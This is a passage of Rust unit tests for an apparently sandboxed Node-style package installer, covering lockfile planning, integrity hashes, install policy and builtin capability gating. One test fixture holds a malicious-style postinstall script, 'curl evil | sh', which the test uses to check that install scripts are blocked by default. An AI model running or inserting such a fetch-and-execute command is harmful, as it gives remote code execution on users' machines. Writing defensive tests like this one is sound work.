        LockedPackage {
            name: name.into(),
            version: semver::Version::parse(ver).unwrap(),
            resolved: format!("https://registry.example/{name}"),
            integrity: format!("sha512-{}", base64_of(&[0u8; 64])),
        }
    }

    #[test]
    fn plan_uses_locked_versions_and_is_sorted() {
        let mut deps = BTreeMap::new();
        deps.insert("b".to_string(), "^2.0.0".to_string());
        deps.insert("a".to_string(), "~1.2.0".to_string());
        let locked = vec![lock("b", "2.1.0"), lock("a", "1.2.9")];
        let plan = plan_dependencies(&deps, &locked);
        assert!(plan.unsatisfied.is_empty());
        assert_eq!(plan.install_order.iter().map(|p| p.name.as_str()).collect::<Vec<_>>(), vec!["a", "b"]);
    }

    #[test]
    fn plan_reports_out_of_range_lock_as_unsatisfied() {
        let mut deps = BTreeMap::new();
        deps.insert("a".to_string(), "^3.0.0".to_string());
        deps.insert("missing".to_string(), "1.0.0".to_string());
        let plan = plan_dependencies(&deps, &[lock("a", "1.0.0")]);
        assert_eq!(
            plan.unsatisfied,
            vec![("a".to_string(), "^3.0.0".to_string()), ("missing".to_string(), "1.0.0".to_string())]
        );
        assert!(plan.install_order.is_empty());
    }

    #[test]
    fn plan_is_deterministic_regardless_of_lock_order() {
        let mut deps = BTreeMap::new();
        deps.insert("a".into(), "1".into());
        deps.insert("b".into(), "1".into());
        let l1 = plan_dependencies(&deps, &[lock("a", "1.0.0"), lock("b", "1.0.0")]);
        let l2 = plan_dependencies(&deps, &[lock("b", "1.0.0"), lock("a", "1.0.0")]);
        assert_eq!(l1, l2);
    }

    // --- integrity --------------------------------------------------------

    fn base64_of(bytes: &[u8]) -> String {
        const A: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut out = String::new();
        for chunk in bytes.chunks(3) {
            let b = [chunk[0], *chunk.get(1).unwrap_or(&0), *chunk.get(2).unwrap_or(&0)];
            let n = ((b[0] as u32) << 16) | ((b[1] as u32) << 8) | b[2] as u32;
            out.push(A[(n >> 18) as usize & 63] as char);
            out.push(A[(n >> 12) as usize & 63] as char);
            out.push(if chunk.len() > 1 { A[(n >> 6) as usize & 63] as char } else { '=' });
            out.push(if chunk.len() > 2 { A[n as usize & 63] as char } else { '=' });
        }
        out
    }

    /// Independently computed reference: sha512 of b"hello" is well known.
    const SHA512_HELLO_B64: &str =
        "m3HSJL1i83hdltRq0+o9czGb+8KJDKra4t/3JRlnPKcjI8PZm6XBHXx6zG4UuMXaDEZjR1wuXDre9G9zvN7AQw==";
    const SHA256_HELLO_B64: &str = "LPJNul+wow4m6DsqxbninhsWHlwfp0JecwQzYpOLmCQ=";

    #[test]
    fn base64_decoder_matches_known_encoding() {
        // round-trip the reference digests through our decoder
        assert_eq!(base64_decode(SHA512_HELLO_B64).unwrap().len(), 64);
        assert_eq!(base64_decode(SHA256_HELLO_B64).unwrap().len(), 32);
        // unpadded input decodes too
        assert_eq!(base64_decode("aGVsbG8").unwrap(), b"hello");
    }

    #[test]
    fn integrity_verifies_real_digests() {
        let s512 = format!("sha512-{SHA512_HELLO_B64}");
        let s256 = format!("sha256-{SHA256_HELLO_B64}");
        assert!(verify_integrity(&s512, b"hello").is_ok());
        assert!(verify_integrity(&s256, b"hello").is_ok());
        assert!(matches!(verify_integrity(&s512, b"hellp"), Err(NodeError::IntegrityMismatch(_))));
    }

    #[test]
    fn integrity_rejects_unknown_algorithm_and_malformed() {
        assert!(matches!(parse_integrity("md5-YWJj"), Err(NodeError::Integrity(_))));
        assert!(matches!(parse_integrity("nonsense"), Err(NodeError::Integrity(_))));
        // right algorithm, wrong digest length
        assert!(parse_integrity("sha512-YWJj").is_err());
    }

    #[test]
    fn cache_path_is_content_addressed_and_dedupes() {
        let a = parse_integrity(&format!("sha512-{SHA512_HELLO_B64}")).unwrap();
        let b = parse_integrity(&format!("sha512-{SHA512_HELLO_B64}")).unwrap();
        assert_eq!(cache_path(&a), cache_path(&b));
        assert!(cache_path(&a).starts_with("cache/content-v2/sha512/"));
        assert!(cache_path(&a).ends_with(&a.hex[4..]));
    }

    // --- install policy ---------------------------------------------------

    const PKG_WITH_SCRIPT: &str = r#"{
      "name": "sneaky",
      "scripts": { "postinstall": "curl evil | sh" },
      "dependencies": {}
    }"#;

    #[test]
    fn install_scripts_are_disabled_by_default() {
        let p = parse_package_json(PKG_WITH_SCRIPT).unwrap();
        let err = evaluate_install(&p, &[], &InstallPolicy::default()).unwrap_err();
        assert!(matches!(err, NodeError::InstallScriptDisabled(_)));
        // explicit opt-in passes
        let policy = InstallPolicy { allow_install_scripts: true, ..Default::default() };
        assert!(evaluate_install(&p, &[], &policy).is_ok());
    }

    #[test]
    fn native_addons_are_blocked_by_default() {
        let p = parse_package_json(r#"{"name":"bcrypt"}"#).unwrap();
        let err = evaluate_install(&p, &["bcrypt.node".to_string()], &InstallPolicy::default()).unwrap_err();
        assert!(matches!(err, NodeError::NativeAddonBlocked(_, _)));
    }

    #[test]
    fn native_addon_arch_is_checked_when_permitted() {
        let p = parse_package_json(r#"{"name":"native","cpu":["arm64"]}"#).unwrap();
        let policy = InstallPolicy {
            allow_native_addons: true,
            host_target: "x86_64-pc-windows-msvc".into(),
            ..Default::default()
        };
        let err = evaluate_install(&p, &["n.node".to_string()], &policy).unwrap_err();
        assert!(matches!(err, NodeError::NativeAddonArchMismatch(_, _, _)));

        // matching cpu passes
        let ok = parse_package_json(r#"{"name":"native","cpu":["x86_64"]}"#).unwrap();
        assert!(evaluate_install(&ok, &["n.node".to_string()], &policy).is_ok());
    }

    #[test]
    fn clean_package_installs_under_default_policy() {
        let p = parse_package_json(r#"{"name":"clean","main":"i.js"}"#).unwrap();
        assert!(evaluate_install(&p, &[], &InstallPolicy::default()).is_ok());
    }

    // --- builtin capability table ----------------------------------------

    #[test]
    fn pure_builtins_allowed_authority_gated() {
        assert_eq!(builtin_access("path"), BuiltinAccess::Allowed);
        assert_eq!(builtin_access("util"), BuiltinAccess::Allowed);
        assert_eq!(builtin_access("buffer"), BuiltinAccess::Allowed);
        assert_eq!(builtin_access("fs"), BuiltinAccess::CapabilityGated(CAP_FS));
        assert!(builtin_access("net").is_gated());
        assert_eq!(builtin_access("process"), BuiltinAccess::CapabilityGated(CAP_PROCESS));
        assert_eq!(builtin_access("child_process"), BuiltinAccess::CapabilityGated(CAP_CHILD));
        assert_eq!(builtin_access("v8"), BuiltinAccess::Denied);
        assert_eq!(builtin_access("vm"), BuiltinAccess::CapabilityGated(CAP_CHILD));
    }

    #[test]
    fn node_prefix_is_stripped_for_classification() {
        assert_eq!(builtin_access("node:path"), BuiltinAccess::Allowed);
        assert_eq!(builtin_access("node:fs"), BuiltinAccess::CapabilityGated(CAP_FS));
    }

    #[test]
    fn is_builtin_distinguishes_packages() {
        assert!(is_builtin("path"));
        assert!(is_builtin("node:fs"));
        assert!(!is_builtin("lodash"));
        assert!(!is_builtin("v8"), "denied modules are not resolvable builtins");
    }

    #[test]
    fn builtin_table_is_complete_and_unique() {
        let t = known_builtins();
        assert_eq!(t.len(), 30);
        let mut names: Vec<&str> = t.iter().map(|(n, _)| *n).collect();
        names.sort_unstable();
        names.dedup();
        assert_eq!(names.len(), 30, "no duplicate rows in the capability table");
    }

    impl BuiltinAccess {
        fn is_gated(self) -> bool {
            matches!(self, BuiltinAccess::CapabilityGated(_))
        }
    }
}
